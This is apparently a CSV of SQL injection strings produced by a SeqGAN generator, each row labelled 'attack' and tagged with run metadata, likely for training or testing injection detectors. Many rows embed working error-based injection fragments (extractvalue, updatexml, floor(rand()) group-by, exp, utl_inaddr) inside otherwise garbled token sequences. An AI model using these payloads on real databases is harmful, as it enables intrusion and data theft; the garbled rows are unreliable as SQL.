label,payload,family,payload_type,method,run_id,sample_index
attack,"1'||  (  select 'oqlwzk. RO'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '   WHERE DS' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||' end  0 |   SELECT by s 7158  (  0  =  )   from   R from       (  from  )   and havingST IEeesurur  (  case) and 9067 4493  9067SELECT 5023  )  )   (  having D x.t_r",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,110
attack,"1'   )     (  *2i,0x717a767a71,  )  )     )   6825 x 0  where 1 ""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""a else 3931 or 113  112  ,1   x  case   )    )   )   8877 m end  from 9067 froms(  having else  =  ||ahr  (  6237,  113  || hr  =  =  =  =  from from union (  0  select   m   SELECT AC oIT:U by    FROM xICTR.seinnt_r  (  >  chr  (  SELECT 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,111
attack,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ' 4493 else chchhr  (  case mselect   a u   where froma concat  )  6055  et  0x7171706a71   (  ,,concat  ||chr  tact_ad_res and 6913  e  )   a 7158 s    1 Eselect from and  1 and1 union >hr  )  || UM 0x717a767a71)   or x byIN' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'T,  0  =  0 4493  %concat  (  ||ICd.U C  1 from  select   )    )   =  ,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,112
attack,"-584015967    thenE  SELECT DISNT  (  randr  *  =     )   (  having      SELECT x group FROM x  ) when     (  select end  )  0  ||'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  's(     AND    FROM h  (  (  ||U  (  ,0x717a767a71,  a when W x  case  =    || or and or (  3440  )    )     :,floor  case 1 RO5inap orx FROM me   thenx  ||chhr  u  ,1    or  )  ||co",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,113
attack,1%yv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,114
attack,"-a""   floor  =  ||rchr  0x7171706a71  106  ||cdhr  (  (  randzn  i   )     and  )  ,floor  (  || concat  rand  ||chr  (  ||ch  e_r  (  112  )  select        hohr  (  =  112  0 )    then 1  )    from 3775  select   (    ||chr  t_adhrouals   2017wbl_  (  select else else  or 1 concat  ||chr  (  0  (  =  cast",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,115
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'w",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,116
attack,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'f    case end  , WHERE d  eoyysauadUe_s(  *2   )     (  ,  (  *2 9067  #ainas   (hr  0x7171706a71 112  SELECT 9067 1 FROM  (  --  122  ||ui  )   or  1 x 1 dCs when1  )   and 1 or h byutl hconcat  =  5856  113,0x717a767a71,  ||chr  (  select  =  ||chr  (  (  )    )   )    )i and drou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,117
attack,1.1M when   then by whenx  =hrhr  =u     )   )    )     )     )   and   WHERE  :hr  (  ||chhr  (  =  (  select cx  =x and d6913hr  (  ||chr  (  rand  SELECT RICTrhrhr  (  rand  ||rand  selectIf.UST (  ||chr  (   select )   from 1 ||   0 1 r  (  )  ||chr  from  (  ||chr  (  (  ||c,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,118
attack,"1hh'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'h'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ''  (   then when  (  ||chr   a =  )   (     1 1      concat  or 0 FROM (  ||chr  (  =  0  ) )    )   union   x   WHERE 1 8488 x DLI.Tcho'touaes_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119
attack,"1   5606    having 7158  )  select 1 from  (  case 0 DL group AND   ,1   )   :a)    R E  *2   )    select      )   having by else  D  and  (  0  v   from else AMIyy LMC CMASNCn FROM by else  (  )    ,b  (  ||chr  rand  113  )  case union 1 x c  =  )0x717a767a71n   *  u,  6825  (   ) FROM 1 fromGGATby 1 end",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120
attack,"1%%""  =  ""' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""zf4493Nu' like 'jtujwb"" like ""where IMEfrom 1 FROMa x 0 union m=  ).  =  rand  case   .chgroysn(  9173  9067n2,  ||chr  select   aadddos.geds.r  (  t  =  *2  =  4232  4232  --2   )     I 6913 L    )a     ,floor     *  SELECT group by x  0  113  case by 1 by unionLcherinadzgjsdd.5t",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122
attack,"1%"" like """" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""`s.1186236   (  9067,floor  when R end  )   )    DIIsias information_schemaTNCv.NCso.chr  (  )  )   )   and or 1  cx  having a from end from FROM 1 from m4232  )   )     )   )    )    n   (  )   (  having 0 end  ||r  (  ),112  =  || 5584 when by DI concat  113  0  ||  r  (  )  ||chr  (  )  )   a IO",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123
attack,"1""   (  = 0u   then or * oru1      (     ||  FROM  (  ||chr  (  ||c  select ,benchmark  =  4232  || m(  (  amv.113  )    6237,concat  (   0          )  ||chr  (  select   x   (     and    1   thencu  ,  )  ) )   then cconcat  (  (  select   t  6270  0x7171706a71,  )  )   then rand  (  select select 9173    (  case   and 1 union and D concat  113  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124
attack," WNWyA  (  a else when   (  6055,floor  selectchr  (  (  ||chr  (  (  113  select 8488.M x  )    ),0x717a767a71,floor  )   SELECT or FROM m when     a dgchr  (  rand  6913  (  ),1392     106  i  ,)   cht_' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'saleys.6237q  122  SELECT AND or 1 5584 d6825a x when   (  =  (  )       )    x Gby 8488 else )   and or 1 ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125
attack,"1%U 5483   (  #,concat  case FROM  =  113  ||cho_r  (  case union1 when   (  =  rand  )     )  >  (  ||  1 from 1 extractvalue  =     112   select whena '   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ' houn   select(  4386  ,0x78   FROM 9325chr  (  00x717a767a71,floor    )   or A||INTr.s  =  )    else from 0 6825 W  (  (  4232  (  select concat  (  113  0x7171706a71113  select113   then group unionxxu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126
attack,"1'||  (  select 'etr'  =  'lsst  (  6237,concat  extractvalue  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127
attack,1%,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128
attack,"1%sbzGb?nfj
pr  e group else 3931 DASCT  =  SELECT LISvINE 1   )   )    #   )   6270     Ox  jhrozoaleidalestunint  (  ||chount  = 1  )     case 1 r  (  case 0 by else from chr  o  ~  113  ||chr  (  112  (  *2 when   )   )  WHERE information_schemauT  (  ||chbdhrr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129
attack,"1% ' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'      (  )    (  )   and0x7171706a71 >hr  (  ||chr  (  select union x group select byx  and froma  1 extractvalue  (  ,  )  )     SELECT by else D else unionx ch1yr_es FROM  (  (  (  4386  0  ,floor  =  *   )    113    )   then 1 union 1 end  select   (  ||chounadd.gsyskeyssan113  ||chr  (  )  ||chr  0  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'sw'  =  'tuktnuawthhr  (,  select 1   )    )    )  (   )    ,floor  )     )     or d 3785 112  (  select 5192 end   then x   from  x  )  and  (  ||  0   )     =  select end  )     and   or AND   x when   extractvalue  *2   ,    (  4232  4386  )   x else  case     6 from8488 3931 elsech 6825 3785 1 when   (  and  )  0x4b774c75 where by 'i'  112  >  0x7171706a71   from   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '8844ut4493",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132
attack,"1%' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'kMunjq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'asaT   or 4232  4232         )  113  from D  1 1  )     :selectdrvnalltun    a 0 byINAT  (  case me x end  then end2 when.U   SELECT group from hchhrx  rr  (     SELECT union1 else whenxo zos",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134
attack,"1'||  (  select 'syesuaa' like ' else else by ) concat  113  ||chr  (  (  *2   ||  122  case z mROW ' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'INWCYux.rchhr  113  ||chhr  (  ||dchr  (  =  *    )   ),concat  || L DINsNUINUN. AIT  )  0  select 0   then end   information_schema,floorhdr  6055   then1 1 DIMSST else 3440  (  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135
attack,"-1or DIERN1INSMINTNN.UM h  (  113  ||chr  (  (  )  #   113  (  case 0    1 5584me 7158     ||c  (  (  0x7171706a71)     )     (  )   || froms where   1 FROMx   eap  0  then(  =     (  ,  )   )    )     >  (    0 fromchxur  6237,  >  113  #2 when   (  (  122  )|| xx end  0x5c)   from WHERE",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""'||  (  select 'r.geter  cast WHERE E  || DSSELECT 1INCT  (  s   (    )   (  )    case   ||chr  (  )  6e  end  4386  )   and   x d.(  =  =  8382  caseRu'  =  '  =x.ehr  1045chhr  =  a  a 3785  end   SELECT else when2   )        )    ,concatu,tler  6   (  ||Ui. 6055hr  (  0x5c  ||chrr  (  (  case  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137
attack,"1"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'am   ))    )    )    andhaving union)     )     )  case where end   then end  )   )    c    ,1 1 when   )1392x.c  113  (  --  || and  (  case 0 '+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'  case  E 6055  )  (  )     )     )   then 1 groupmI Oo.edrue  1297hr  (  6237,  =  )  tleaaadmaleradr.eras(  6237,concat  0  )   or union select 5584 else    from ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138
attack,"1{MC AND0INIG RMI ANT  FROM  =  )  )    )     )    duaadadr  x concat select else Rchr  (  (  (  1297,  *  select FROM   (  ||chrhoutthrosygout",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""  = select from 2017 union  )    concat  6237  )  *)   having x chhr  (  case ||  (  4232  1045  ||chr  (  )  )   FROM WHERE union 0 7881 chr  ||  (  (  )--  ||chr  (  (  case 0   thenhr  select   =  a 8488 5192 5192xtho.  (  (  ||  (  select from and )  6825c else 5023  )  ||chr  (  ||chr  (  4232  113  ,0x717a767a71,floor",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140
attack,"-Ba 3931 end  ,concat  >  (  select AND 6825a 2131  select  (  ||  (  *,r  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141
attack,"1""  0   )    (  )    from   (  as x U when   1392 from  =  un   )    )0x717a767a71,0x717a767a71le group 3931 whenduaityyas (  ||chr  0x7171706a71  case from 6082hr    (  select   (  )  select 3440  )    )  )   x   x 1 m union end  ||chr  (  select and   (  ||chr  =  9173   SELECT 5192 D WHERE Gby 9173 A1x  (  4232  select :yualt_aa'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142
attack,"1'   (  =  ,0x717a767a71,0x717a767a71,floor  =  )       )   x   x 3931 drnac  (  =  0 8877 else 4493  select  5840  )   FROM    a  D and  I hUwhrNry's duar  er  (  rand  )     =  t_r  (  case        ||chr  chr  8382  select else by rr  (  ||r  selectn  )   )    )  =  )   (  case when group 7158  ,5192i,0x717a767a71,0x717a767a71,0x717a767a71,concat  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""   (    )     )   )   from 5584 4607u  0x7171706a710x7171706a716055  case from concat  ||chr  (  =  ,0x717a767a71,concat  (  )    )   6082  case   )    )   from.by else 0 4493r  =  )   (  ,0x717a767a71,     1 when   (  select from 1 0  0and      0,1   )    7562  ||r  113  ||ctr  (  (  select AND 0 SELECT from   a 6082 4386  '  =  'iadrararodr    .chr  (  0x7171706a71113  SELECT",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144
attack,"-6TEz  >  =  )   having from from,4493  select  'i'    ||u  rand  122  ||chr  ((  select  )  chr  ||chr r  (  (  (  ||chr  (  case union and  ||UsT  0  )   thenWHERE m  m AND group N concat  (  rand  ||    (  ,   thenx  ||UNp E FROM  (  * end  el_lt_ntass group 1   chr  (  case)having,0x717a767a71,floor  0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145
attack,1',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ral"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147
attack,"1"" or when   (  (  case ||  113  =  case when   x  =  ||,hr  (  select   )    )    )   )    )     ) and FROM concatx      where R ' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '(  =  106  rand  )  select end   FROM   (  * 1045  )    )     x from xxxI.rp.s GRE(  ||  case  6055 or c  ||oun   ax.gykr  (  (  *2   )     0x717a767a712   )    )  ,o or when d.Uch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148
attack,"1%fcchht_als   )    )   (       SELECTIN.r    =  (  select   SELECT where end   nthen 1 3931 else where where 0lannu2   )    )   (  )   )     5023  )   (,1  from   addnayter.sna,  (  ||s 6913 by when.r  (  =  ey",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149
attack,"1'||  (  select '_7562thjutuT   )    )    nt  (  ,0x717a767a71,     *2   (  )   )       selectfrom group m   R   0x717a767a71and:_r  (  ||cr  (  ,  >  0  )   )     5305 1 and  8190  *  =  ||a k 5023  (  select union 1 by E 0x7171706a71 3931 by 0    thenx FROMu   (  --einaxt_r  (  (  ||chr  (  (  )chr  (  (  case Cselect group  L union ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150
attack,"1""  ,floor  3440  ,0x717a767a71  --a when  a 1 RI.s from (  )  0  ,  *,  )   (  )  rand  =  3326aT  0  (  (  --2   (     ))   )    )    WHERE AND group 1  1N  chr    se end union whenuthenchruhr  (  (  0  = :-chr  4232  )  =,  0   n     )    6055  and from from ||AND else by LINERT  case,1   x   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151
attack,"10x717a767a71""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152
attack,"-4493%6237\*o'  =  'sand2   46074232  )   WHERE by FROM LLs or chchr  4386hr  (  or  ,  ||chr  (  (  4232  0x7171706a71,concat  6055  --aytsutal  =  )   (  )   x 3931 5584 x when  selectgetr  (  select   112  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153
attack,"1"" then from  select   (  )   (  )  )  )   )     then  SELECT ,  ||chruars 0  else   )    )  ,    )  )     )   thenS 0uintoyyyxless  select RCCT  chpuas   (  case else DIRT  )   or5192 DI  )    ,  =  )       )    )     --  (  )     ,1   (  )    )     a dutxt_r.113  )  ||lhr  (  (  select ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,154
attack,"1'||  (  select 'ilp     113  FROMaychhr  ||  select dd hr  (  (  122  chr  ,0x717a767a71  )  ||chhr  (    4232  (  casedal_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,155
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,156
attack,"1%62361     '   WHERE by 1 end   5978     *   FROM DT  ||U 0M and  )  4232  ||cr  (  case when   xrr x.T  (  (  case end  SELECTch (  =  )   )   thenwu,_l_in*(  then union 5023  ( when  from  case 1 5023  case end  (  ||r  (  ,,floor  (  )     ||chr  (   )  select ||  (  rand  ||chr  (  ||chr  extractvalue  (  (  having",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,157
attack,"1'||  (  select 'rNnalb"" like ""asx_nt_ant",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,158
attack,"1If_""  =  ""aerardowjunal",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,159
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   """"  =  ""34510",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,160
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ayw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,161
attack,"-""  4232  0x7171706a71)   from or 2131 when  =hr  (  ,  ||cs     AND    )        (  (  =  selecta Dby LE    n 9627n 0 0 6055  extractvalue  (  )   fromua end   xn   select where select   0  )   x    R  case  end  )    cRrxys.e  t  ||  (  select   '   )     ||  (  case concat  casecxr.syg  =  (  ,>  9173,1   )    ,' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ' union ISNAS",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,162
attack,"1%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""ouww'  =  'w_'  =  ' and0x717a767a71(  4232  ||  (  ||  extractvalue  *  113        =  4232  )   ,0x717a767a71,1   then  select 7881 FROM (  SELECT byu or )     )#  )  )    from union information_schemach6270  4232  ||chr  (  6237,1     #tdr.ol  )    )    havingI L3931INSNT     )  (  select from 5023  6055  ||  ||  113  *  )  *lo  )   )     ||.chr  (  (  12 3051",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,163
attack,1.18844,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,164
attack,"1 || concat  =  select   and)    then (  (  9067),0x717a767a71,floor  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,165
attack,17562faT  (  ||  (  1392u,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,166
attack,1%%'  =  'bsn,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,167
attack,-6VSWx'  =  'loblal,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,168
attack,"1%'  =  '5606   5032 or by  hr  (  5840  0  --,0x717a767a71,0x717a767a71  ),     )  =  )  )   x2  ||chr  (  6237  (  ||chr  (  1  )   x   or by dy from from  case   (hr  (  =  n du  113  rand  (  t  )  select 1 WHERE   9067 --  =  =     )having 6082 1        0from from ahr  (  =  ,9067 w  ||uelbt_aidrgq_ad.  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,169
